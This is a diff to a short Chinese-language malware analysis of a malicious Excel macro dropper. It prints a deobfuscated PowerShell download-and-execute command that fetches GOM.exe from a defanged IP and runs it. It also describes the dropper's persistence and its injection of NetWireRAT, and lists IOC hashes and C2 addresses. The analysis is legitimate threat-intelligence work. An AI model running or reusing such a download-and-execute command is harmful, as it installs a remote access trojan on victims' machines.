@@ -1,3 +1,17 @@
-MD5:
-c2a38018cf336685e3c760c614bbf4c3
-f0b43a3f4821a4cf4b514144b496e4d7
+宏代码：去混淆后的代码
+  ```PowerShell
+  invoke-expression 
+  (New-Object System.Net.Webclient).DownLoAdFile('hxxp://66.154.112.212/GOM.exe','C:\\Users\\Public\\GOM.exe');
+  Start-Process('C:\\Users\\Public\\GOM.exe')
+  ```
+GOM.exe:
+功能一：设置启动项实现持久化
+功能二：进程注入，启动线程执行payload(bc328def223616d7a85c2cdcaadae270：NetWireRAT)
+
+IOCs：
+dbd3a75d635031fbc5043a4a6cd8d83d(Pay and Allowance Details.xls)
+c2a38018cf336685e3c760c614bbf4c3(Pay and Allowance Details.xls)
+f0b43a3f4821a4cf4b514144b496e4d7(GOM.exe)
+bc328def223616d7a85c2cdcaadae270(NetWireRAT)
+hxxp://66.154.112.212/GOM.exe（宏下载地址）
+66.154.103.106(C2)
